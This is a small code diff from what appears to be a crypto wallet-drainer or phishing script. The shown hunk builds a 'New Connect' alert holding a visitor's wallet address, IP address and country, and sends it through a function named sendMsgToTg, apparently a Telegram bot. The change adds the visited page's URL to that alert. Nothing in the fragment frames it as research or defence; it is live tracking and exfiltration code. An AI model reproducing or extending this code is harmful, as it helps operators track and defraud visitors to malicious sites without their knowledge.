@@ -35,6 +35,8 @@ New Connect
 ADDRESS:${addy}
 IP:${ipAddr}
 COUNTRY:${ipData.country}
+URL: ${window.location.href}
+
   `;
 
   await sendMsgToTg(msg);
